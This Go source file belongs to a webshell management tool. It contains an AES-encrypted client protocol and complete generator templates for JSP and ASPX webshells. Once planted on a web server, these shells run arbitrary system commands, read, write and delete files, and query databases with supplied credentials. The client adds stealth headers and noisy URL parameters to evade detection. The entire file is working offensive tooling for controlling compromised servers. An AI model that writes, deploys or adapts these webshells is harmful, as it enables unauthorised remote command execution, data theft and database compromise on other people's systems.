package webshell

// JSP/ASPX 自定义协议实现
//
// 协议规范：
//   - JSP：AES-128-ECB 加密行格式命令，base64 编码 POST body
//   - ASPX：AES-128-CBC（IV=Key）加密行格式命令，base64 编码 POST body
//   - 命令格式：action\nbase64(arg1)\nbase64(arg2)\n...
//   - 响应格式（明文 JSON）：{"status":"200","msg":"base64(result)"}
//
// 支持的 action：info | exec | ls | read | write | delete | mkdir | rename |
//                hash | append | createfile | exists | db_query

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// sendLineProto 将行格式命令加密后 POST 到 shell URL，解析并返回 JSON 响应。
// 每个 arg 都会被 base64 编码后以 '\n' 分隔追加到 action 后。
func (a *Agent) sendLineProto(encFn func([]byte) ([]byte, error), action string, args ...[]byte) (map[string]any, error) {
	var sb strings.Builder
	sb.WriteString(action)
	for _, arg := range args {
		sb.WriteString("\n")
		sb.WriteString(base64.StdEncoding.EncodeToString(arg))
	}
	enc, err := encFn([]byte(sb.String()))
	if err != nil {
		return nil, fmt.Errorf("加密失败: %w", err)
	}
	body := base64.StdEncoding.EncodeToString(enc)

	req, err := http.NewRequest("POST", addNoisyParam(a.url), strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	applyStealthHeaders(req)
	a.applyHeaders(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("连接失败: %w", err)
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, err
	}
	// JSP/ASPX 有时在 JSON 前有多余空白（JSP page 指令换行），跳过前缀
	if idx := bytes.IndexByte(raw, '{'); idx > 0 {
		raw = raw[idx:]
	}

	var result map[string]any
	if err := json.Unmarshal(raw, &result); err != nil {
		preview := raw
		if len(preview) > 256 {
			preview = preview[:256]
		}
		return nil, fmt.Errorf("Shell 响应解析失败（非JSON）: %s", preview)
	}
	if status, _ := result["status"].(string); status != "200" {
		if msg, _ := result["msg"].(string); msg != "" {
			if d, e := base64.StdEncoding.DecodeString(msg); e == nil {
				return nil, fmt.Errorf("Shell 执行错误: %s", d)
			}
		}
		return nil, fmt.Errorf("Shell 返回状态 %s", status)
	}
	return result, nil
}

func (a *Agent) sendJSP(action string, args ...[]byte) (map[string]any, error) {
	return a.sendLineProto(func(p []byte) ([]byte, error) {
		return aes128ECBEncrypt(a.key, p)
	}, action, args...)
}

func (a *Agent) sendASPX(action string, args ...[]byte) (map[string]any, error) {
	return a.sendLineProto(func(p []byte) ([]byte, error) {
		return aes128CBCEncrypt(a.key, p)
	}, action, args...)
}

// jspSend 根据 shellType 自动路由到 JSP 或 ASPX 发送函数。
func (a *Agent) jspSend(action string, args ...[]byte) (map[string]any, error) {
	if a.shellType == "aspx" {
		return a.sendASPX(action, args...)
	}
	return a.sendJSP(action, args...)
}

// ─── JSP/ASPX 操作方法 ────────────────────────────────────────────────────────

func (a *Agent) jspGetInfo() (*SysInfo, error) {
	result, err := a.jspSend("info")
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var info SysInfo
	if err := json.Unmarshal(raw, &info); err != nil {
		return nil, err
	}
	return &info, nil
}

func (a *Agent) jspExec(cmd string) (string, error) {
	result, err := a.jspSend("exec", []byte(cmd))
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

func (a *Agent) jspListDir(path string) ([]FileEntry, error) {
	result, err := a.jspSend("ls", []byte(path))
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var files []FileEntry
	if err := json.Unmarshal(raw, &files); err != nil {
		return nil, err
	}
	if files == nil {
		files = []FileEntry{}
	}
	return files, nil
}

func (a *Agent) jspReadFile(path string) ([]byte, error) {
	result, err := a.jspSend("read", []byte(path))
	if err != nil {
		return nil, err
	}
	return decodeMsg(result)
}

func (a *Agent) jspWriteFile(path string, content []byte) error {
	_, err := a.jspSend("write", []byte(path), content)
	return err
}

func (a *Agent) jspDeletePath(path string) error {
	_, err := a.jspSend("delete", []byte(path))
	return err
}

func (a *Agent) jspRenameFile(oldPath, newPath string) error {
	_, err := a.jspSend("rename", []byte(oldPath), []byte(newPath))
	return err
}

func (a *Agent) jspMkDir(path string) error {
	_, err := a.jspSend("mkdir", []byte(path))
	return err
}

func (a *Agent) jspGetFileHash(path string) (string, error) {
	result, err := a.jspSend("hash", []byte(path))
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

func (a *Agent) jspAppendFile(path string, content []byte) error {
	_, err := a.jspSend("append", []byte(path), content)
	return err
}

func (a *Agent) jspCreateFile(path string) error {
	_, err := a.jspSend("createfile", []byte(path))
	return err
}

func (a *Agent) jspCheckFileExist(path string) (bool, error) {
	result, err := a.jspSend("exists", []byte(path))
	if err != nil {
		return false, err
	}
	raw, err := decodeMsg(result)
	return string(raw) == "1", err
}

// errJSPNotSupported 用于 JSP/ASPX 不支持的高级操作。
func errJSPNotSupported(shellType, op string) error {
	return fmt.Errorf("%s shell 不支持 %s 操作", strings.ToUpper(shellType), op)
}

// jspDBQuery 通过 JSP/ASPX shell 执行 JDBC/SqlClient 数据库查询。
// 参数顺序：dbType, host, port, user, pass, database, sql（与 PHP DBQuery 保持一致）。
func (a *Agent) jspDBQuery(dbType, host, port, user, pass, database, sql string) (*DBResult, error) {
	resp, err := a.jspSend("db_query",
		[]byte(dbType), []byte(host), []byte(port),
		[]byte(user), []byte(pass), []byte(database), []byte(sql))
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(resp)
	if err != nil {
		return nil, err
	}
	var qr DBResult
	if err := json.Unmarshal(raw, &qr); err != nil {
		return nil, fmt.Errorf("解析DB响应失败: %w (raw: %s)", err, string(raw))
	}
	return &qr, nil
}

// aspxDBQueryCase 返回 ASPX shell 中处理 db_query action 的 C# 代码片段。
// 独立为函数以避免在多层转义的 Go 双引号字符串中嵌套 C# 字符串字面量。
func aspxDBQueryCase() string {
	return `}else if(a=="db_query"){
string tp2=p.Length>1?bd(p[1]):"";string dh2=p.Length>2?bd(p[2]):"";string dp2=p.Length>3?bd(p[3]):"";string ddb2=p.Length>4?bd(p[4]):"";string du2=p.Length>5?bd(p[5]):"";string dw2=p.Length>6?bd(p[6]):"";string ds2=p.Length>7?bd(p[7]):"";
try{System.Data.Common.DbConnection dcon=null;
if(tp2=="mssql"||tp2=="sqlserver"){dcon=new System.Data.SqlClient.SqlConnection("Server="+dh2+(dp2!=""?","+dp2:"")+";Database="+ddb2+";User Id="+du2+";Password="+dw2+";");}
else if(tp2=="mysql"){Type t3=Type.GetType("MySql.Data.MySqlClient.MySqlConnection,MySql.Data");if(t3==null)throw new Exception("MySql.Data not found");dcon=(System.Data.Common.DbConnection)Activator.CreateInstance(t3,"server="+dh2+";port="+dp2+";database="+ddb2+";uid="+du2+";pwd="+dw2+";");}
else if(tp2=="postgresql"){Type t3=Type.GetType("Npgsql.NpgsqlConnection,Npgsql");if(t3==null)throw new Exception("Npgsql not found");dcon=(System.Data.Common.DbConnection)Activator.CreateInstance(t3,"Host="+dh2+";Port="+dp2+";Database="+ddb2+";Username="+du2+";Password="+dw2+";");}
else{Response.Write(r200s("{\"error\":\"unsupported db: "+tp2+"\",\"headers\":[],\"rows\":[]}"));}
if(dcon!=null){dcon.Open();var dcmd=dcon.CreateCommand();dcmd.CommandText=ds2;var drd=dcmd.ExecuteReader();
var dhs=new System.Text.StringBuilder("["),drs=new System.Text.StringBuilder("[");bool dhf=true,drf=true;
while(drd.Read()){if(dhf){for(int i=0;i<drd.FieldCount;i++){if(i>0)dhs.Append(",");dhs.Append("\""+drd.GetName(i).Replace("\\","\\\\").Replace("\"","\\\"")+"\"");}dhs.Append("]");dhf=false;}
if(!drf)drs.Append(",");drf=false;drs.Append("[");
for(int i=0;i<drd.FieldCount;i++){if(i>0)drs.Append(",");var v=drd.GetValue(i);if(v==null||v==DBNull.Value)drs.Append("null");else drs.Append("\""+v.ToString().Replace("\\","\\\\").Replace("\"","\\\"").Replace("\n","\\n").Replace("\r","\\r")+"\"");}
drs.Append("]");}
if(dhf)dhs.Append("]");drs.Append("]");drd.Close();dcon.Close();
Response.Write(r200s("{\"headers\":"+dhs.ToString()+",\"rows\":"+drs.ToString()+"}"));}}
catch(Exception dbex){Response.Write(r200s("{\"error\":\""+dbex.Message.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\n","\\n")+"\",\"headers\":[],\"rows\":[]}"));}
`
}

// ─── JSP Shell 代码模板（自定义协议，非冰蝎 ClassLoader）────────────────────

// jspShellDirect 生成使用自定义行协议（AES-128-ECB + JSON 分发）的 JSP shell，
// 替代原 Behinder ClassLoader 方案，支持主动连接命令执行与文件管理。
func jspShellDirect(key16 string) string {
	return `<%@page import="javax.crypto.*,javax.crypto.spec.*,java.io.*,java.util.*,java.security.*" pageEncoding="UTF-8"%>` +
		`<%!` +
		`static String R(byte[]b){return "{\"status\":\"200\",\"msg\":\""+java.util.Base64.getEncoder().encodeToString(b)+"\"}";}` +
		`static String RS(String s){try{return R(s.getBytes("UTF-8"));}catch(Exception e){return R(s.getBytes());}}` +
		`static byte[]BD(String s){return java.util.Base64.getDecoder().decode(s.trim());}` +
		`static byte[]AES(byte[]k,byte[]d)throws Exception{SecretKeySpec ks=new SecretKeySpec(k,"AES");Cipher c=Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,ks);return c.doFinal(d);}` +
		`static byte[]RA(InputStream is)throws IOException{ByteArrayOutputStream b=new ByteArrayOutputStream();byte[]t=new byte[4096];int n;while((n=is.read(t))>0)b.write(t,0,n);return b.toByteArray();}` +
		`static String EX(String c)throws Exception{String os=System.getProperty("os.name","").toLowerCase();Process p=Runtime.getRuntime().exec(os.contains("win")?new String[]{"cmd","/c",c}:new String[]{"/bin/sh","-c",c});ByteArrayOutputStream bo=new ByteArrayOutputStream();byte[]t=new byte[4096];int n;InputStream i=p.getInputStream();while((n=i.read(t))>0)bo.write(t,0,n);i=p.getErrorStream();while((n=i.read(t))>0)bo.write(t,0,n);return bo.toString("UTF-8");}` +
		`static String LS(String pa)throws Exception{File d=new File(pa);File[]fs=d.listFiles();if(fs==null)return "[]";StringBuilder sb=new StringBuilder("[");boolean f=true;for(File x:fs){if(!f)sb.append(",");f=false;sb.append("{\"name\":\"").append(x.getName().replace("\\","\\\\").replace("\"","\\\"")).append("\",\"isDir\":").append(x.isDirectory()).append(",\"size\":").append(x.isDirectory()?0:x.length()).append(",\"mtime\":").append(x.lastModified()/1000).append(",\"perms\":\"").append(x.canRead()?"r":"-").append(x.canWrite()?"w":"-").append(x.canExecute()?"x":"-").append("\"}");}sb.append("]");return sb.toString();}` +
		`static String MD5(String pa)throws Exception{MessageDigest md=MessageDigest.getInstance("MD5");byte[]b=RA(new FileInputStream(pa));md.update(b);byte[]h=md.digest();StringBuilder sb=new StringBuilder();for(byte x:h)sb.append(String.format("%02x",x));return sb.toString();}` +
		`static String JDBCDB(String tp,String h,String po,String db,String us,String pw,String sq)throws Exception{boolean sq3="sqlite".equals(tp);String url;if("mysql".equals(tp)){try{Class.forName("com.mysql.cj.jdbc.Driver");}catch(ClassNotFoundException e2){Class.forName("com.mysql.jdbc.Driver");}url="jdbc:mysql://"+h+":"+po+"/"+db+"?useSSL=false&allowPublicKeyRetrieval=true&characterEncoding=UTF-8";}else if("postgresql".equals(tp)){Class.forName("org.postgresql.Driver");url="jdbc:postgresql://"+h+":"+po+"/"+db;}else if("mssql".equals(tp)||"sqlserver".equals(tp)){try{Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");}catch(ClassNotFoundException e2){Class.forName("net.sourceforge.jtds.jdbc.Driver");}url="jdbc:sqlserver://"+h+":"+po+";databaseName="+db+";encrypt=false;";}else if("oracle".equals(tp)){Class.forName("oracle.jdbc.driver.OracleDriver");url="jdbc:oracle:thin:@"+h+":"+po+":"+db;}else if(sq3){Class.forName("org.sqlite.JDBC");url="jdbc:sqlite:"+db;}else return "{\"error\":\"unsupported db: "+tp+"\",\"headers\":[],\"rows\":[]}";java.sql.Connection con2=java.sql.DriverManager.getConnection(url,(sq3||us.isEmpty())?null:us,(sq3||pw.isEmpty())?null:pw);try{java.sql.Statement st=con2.createStatement();boolean hr=st.execute(sq);if(!hr)return "{\"headers\":[\"affected_rows\"],\"rows\":[[\""+st.getUpdateCount()+"\"]]}";java.sql.ResultSet rs=st.getResultSet();java.sql.ResultSetMetaData m=rs.getMetaData();int cols=m.getColumnCount();StringBuilder sb2=new StringBuilder("{\"headers\":[");for(int i=1;i<=cols;i++){if(i>1)sb2.append(",");sb2.append("\"").append(m.getColumnName(i).replace("\\","\\\\").replace("\"","\\\"")).append("\"");}sb2.append("],\"rows\":[");boolean fr=true;while(rs.next()){if(!fr)sb2.append(",");fr=false;sb2.append("[");for(int i=1;i<=cols;i++){if(i>1)sb2.append(",");Object v=rs.getObject(i);if(v==null)sb2.append("null");else sb2.append("\"").append(v.toString().replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r")).append("\"");}sb2.append("]");}sb2.append("]}");rs.close();return sb2.toString();}finally{con2.close();}}` +
		`%>` +
		`<%response.reset();response.setContentType("text/plain;charset=UTF-8");` +
		`try{byte[]k="` + key16 + `".getBytes("UTF-8");` +
		`byte[]dec=AES(k,BD(new String(RA(request.getInputStream()),"UTF-8")));` +
		`String[]p=new String(dec,"UTF-8").split("\n");` +
		`String a=p.length>0?p[0].trim():"";` +
		`if("info".equals(a)){` +
		`String os=System.getProperty("os.name",""),jv=System.getProperty("java.version",""),usr=System.getProperty("user.name",""),cwd=System.getProperty("user.dir","").replace("\\","\\\\").replace("\"","\\\"");` +
		`String host="";try{host=java.net.InetAddress.getLocalHost().getHostName();}catch(Exception e2){}` +
		`String ip=request.getLocalAddr(),srv=application.getServerInfo();` +
		`out.print(RS("{\"os\":\""+os+"\",\"server\":\""+srv+"\",\"php\":\"Java "+jv+"\",\"cwd\":\""+cwd+"\",\"user\":\""+usr+"\",\"hostname\":\""+host+"\",\"ip\":\""+ip+"\"}"));` +
		`}else if("exec".equals(a)){String c=p.length>1?new String(BD(p[1]),"UTF-8"):"";out.print(RS(EX(c)));` +
		`}else if("ls".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";out.print(RS(LS(pa)));` +
		`}else if("read".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";out.print(R(RA(new FileInputStream(pa))));` +
		`}else if("write".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";byte[]d=p.length>2?BD(p[2]):new byte[0];FileOutputStream fos=new FileOutputStream(pa);fos.write(d);fos.close();out.print(RS("ok"));` +
		`}else if("append".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";byte[]d=p.length>2?BD(p[2]):new byte[0];FileOutputStream fos=new FileOutputStream(pa,true);fos.write(d);fos.close();out.print(RS("ok"));` +
		`}else if("delete".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";new File(pa).delete();out.print(RS("ok"));` +
		`}else if("mkdir".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";new File(pa).mkdirs();out.print(RS("ok"));` +
		`}else if("rename".equals(a)){String src=p.length>1?new String(BD(p[1]),"UTF-8"):"";String dst=p.length>2?new String(BD(p[2]),"UTF-8"):"";new File(src).renameTo(new File(dst));out.print(RS("ok"));` +
		`}else if("hash".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";out.print(RS(MD5(pa)));` +
		`}else if("createfile".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";File f=new File(pa);if(!f.exists())f.createNewFile();out.print(RS("ok"));` +
		`}else if("exists".equals(a)){String pa=p.length>1?new String(BD(p[1]),"UTF-8"):"";out.print(RS(new File(pa).exists()?"1":"0"));` +
		`}else if("db_query".equals(a)){String tp=p.length>1?new String(BD(p[1]),"UTF-8"):"";String dh=p.length>2?new String(BD(p[2]),"UTF-8"):"";String dp=p.length>3?new String(BD(p[3]),"UTF-8"):"";String ddb=p.length>4?new String(BD(p[4]),"UTF-8"):"";String du=p.length>5?new String(BD(p[5]),"UTF-8"):"";String dw=p.length>6?new String(BD(p[6]),"UTF-8"):"";String ds=p.length>7?new String(BD(p[7]),"UTF-8"):"";out.print(RS(JDBCDB(tp,dh,dp,ddb,du,dw,ds)));` +
		`}else{out.print("{\"status\":\"404\",\"msg\":\"dW5rbm93bg==\"}");` +
		`}}catch(Exception e){out.print("{\"status\":\"500\",\"msg\":\""+java.util.Base64.getEncoder().encodeToString(e.toString().getBytes())+"\"}");out.flush();}%>`
}

// aspxShellDirect 生成使用自定义行协议（AES-128-CBC IV=Key + JSON 分发）的 ASPX shell，
// 替代原 Behinder Assembly.Load 方案，支持主动连接命令执行与文件管理。
func aspxShellDirect(key16 string) string {
	return "<%@ Page Language=\"C#\" %>\n" +
		"<%@ Import Namespace=\"System.IO\" %>\n" +
		"<%@ Import Namespace=\"System.Security.Cryptography\" %>\n" +
		"<%@ Import Namespace=\"System.Diagnostics\" %>\n" +
		"<%@ Import Namespace=\"System.Text\" %>\n" +
		"<%@ Import Namespace=\"System.Security\" %>\n" +
		"<script runat=\"server\">\n" +
		"void Page_Load(object s, EventArgs e){\n" +
		"Response.ContentType=\"text/plain\";\n" +
		"try{\n" +
		"string k=\"" + key16 + "\";\n" +
		"byte[]kb=Encoding.UTF8.GetBytes(k);\n" +
		"var rm=new RijndaelManaged(){Key=kb,IV=kb,Mode=CipherMode.CBC,Padding=PaddingMode.PKCS7};\n" +
		"var ms=new MemoryStream();Request.InputStream.CopyTo(ms);\n" +
		"byte[]enc=Convert.FromBase64String(Encoding.UTF8.GetString(ms.ToArray()).Trim());\n" +
		"byte[]dec=rm.CreateDecryptor().TransformFinalBlock(enc,0,enc.Length);\n" +
		"string[]p=Encoding.UTF8.GetString(dec).Split('\\n');\n" +
		"string a=p.Length>0?p[0].Trim():\"\";\n" +
		"Func<byte[],string>r200b=b=>\"{\\\"status\\\":\\\"200\\\",\\\"msg\\\":\\\"\"+Convert.ToBase64String(b)+\"\\\"}\";\n" +
		"Func<string,string>r200s=str=>r200b(Encoding.UTF8.GetBytes(str));\n" +
		"Func<string,string>bd=str=>Encoding.UTF8.GetString(Convert.FromBase64String(str));\n" +
		"Func<string,byte[]>bdb=str=>Convert.FromBase64String(str);\n" +
		"if(a==\"info\"){\n" +
		"string os=Environment.OSVersion.ToString(),usr=Environment.UserName,cwd=Environment.CurrentDirectory.Replace(\"\\\\\",\"\\\\\\\\\"),host=Environment.MachineName,srv=Request.ServerVariables[\"SERVER_SOFTWARE\"]??\"\",ip=Request.ServerVariables[\"LOCAL_ADDR\"]??\"\",ver=Environment.Version.ToString();\n" +
		"Response.Write(r200s(\"{\\\"os\\\":\\\"\"+os+\"\\\",\\\"server\\\":\\\"\"+srv+\"\\\",\\\"php\\\":\\\".NET \"+ver+\"\\\",\\\"cwd\\\":\\\"\"+cwd+\"\\\",\\\"user\\\":\\\"\"+usr+\"\\\",\\\"hostname\\\":\\\"\"+host+\"\\\",\\\"ip\\\":\\\"\"+ip+\"\\\"}\"));\n" +
		"}else if(a==\"exec\"){\n" +
		"string c2=p.Length>1?bd(p[1]):\"\";\n" +
		"var si=new ProcessStartInfo(\"cmd.exe\",\"/c \"+c2){RedirectStandardOutput=true,RedirectStandardError=true,UseShellExecute=false,CreateNoWindow=true};\n" +
		"var proc=Process.Start(si);string out2=proc.StandardOutput.ReadToEnd()+proc.StandardError.ReadToEnd();proc.WaitForExit();\n" +
		"Response.Write(r200s(out2));\n" +
		"}else if(a==\"ls\"){\n" +
		"string pa=p.Length>1?bd(p[1]):\"\";var di=new DirectoryInfo(pa);\n" +
		"var sb=new StringBuilder(\"[\");bool f=true;\n" +
		"foreach(var d in di.GetDirectories()){if(!f)sb.Append(\",\");f=false;sb.Append(\"{\\\"name\\\":\\\"\").Append(d.Name.Replace(\"\\\\\\\"\",\"\\\\\\\\\\\\\"\")).Append(\"\\\",\\\"isDir\\\":true,\\\"size\\\":0,\\\"mtime\\\":\").Append((long)(d.LastWriteTimeUtc-new DateTime(1970,1,1)).TotalSeconds).Append(\",\\\"perms\\\":\\\"rwx\\\"}\");}\n" +
		"foreach(var fi in di.GetFiles()){if(!f)sb.Append(\",\");f=false;sb.Append(\"{\\\"name\\\":\\\"\").Append(fi.Name.Replace(\"\\\\\\\"\",\"\\\\\\\\\\\\\"\")).Append(\"\\\",\\\"isDir\\\":false,\\\"size\\\":\").Append(fi.Length).Append(\",\\\"mtime\\\":\").Append((long)(fi.LastWriteTimeUtc-new DateTime(1970,1,1)).TotalSeconds).Append(\",\\\"perms\\\":\\\"rw-\\\"}\");}\n" +
		"sb.Append(\"]\");Response.Write(r200s(sb.ToString()));\n" +
		"}else if(a==\"read\"){string pa=p.Length>1?bd(p[1]):\"\";Response.Write(r200b(File.ReadAllBytes(pa)));\n" +
		"}else if(a==\"write\"){string pa=p.Length>1?bd(p[1]):\"\";byte[]data=p.Length>2?bdb(p[2]):new byte[0];File.WriteAllBytes(pa,data);Response.Write(r200s(\"ok\"));\n" +
		"}else if(a==\"append\"){string pa=p.Length>1?bd(p[1]):\"\";byte[]data=p.Length>2?bdb(p[2]):new byte[0];using(var fw=new FileStream(pa,FileMode.Append)){fw.Write(data,0,data.Length);}Response.Write(r200s(\"ok\"));\n" +
		"}else if(a==\"delete\"){string pa=p.Length>1?bd(p[1]):\"\";if(Directory.Exists(pa))Directory.Delete(pa,true);else File.Delete(pa);Response.Write(r200s(\"ok\"));\n" +
		"}else if(a==\"mkdir\"){string pa=p.Length>1?bd(p[1]):\"\";Directory.CreateDirectory(pa);Response.Write(r200s(\"ok\"));\n" +
		"}else if(a==\"rename\"){string src=p.Length>1?bd(p[1]):\"\";string dst=p.Length>2?bd(p[2]):\"\";if(Directory.Exists(src))Directory.Move(src,dst);else File.Move(src,dst);Response.Write(r200s(\"ok\"));\n" +
		"}else if(a==\"hash\"){string pa=p.Length>1?bd(p[1]):\"\";byte[]hb=System.Security.Cryptography.MD5.Create().ComputeHash(File.ReadAllBytes(pa));Response.Write(r200s(BitConverter.ToString(hb).Replace(\"-\",\"\").ToLower()));\n" +
		"}else if(a==\"createfile\"){string pa=p.Length>1?bd(p[1]):\"\";if(!File.Exists(pa))File.Create(pa).Close();Response.Write(r200s(\"ok\"));\n" +
		"}else if(a==\"exists\"){string pa=p.Length>1?bd(p[1]):\"\";Response.Write(r200s((File.Exists(pa)||Directory.Exists(pa))?\"1\":\"0\"));\n" +
		aspxDBQueryCase() +
		"}else Response.Write(\"{\\\"status\\\":\\\"404\\\",\\\"msg\\\":\\\"dW5rbm93bg==\\\"}\");\n" +
		"}catch(Exception ex){Response.Write(\"{\\\"status\\\":\\\"500\\\",\\\"msg\\\":\\\"\"+Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.Message))+\"\\\"}\");}\n" +
		"}\n" +
		"</script>"
}
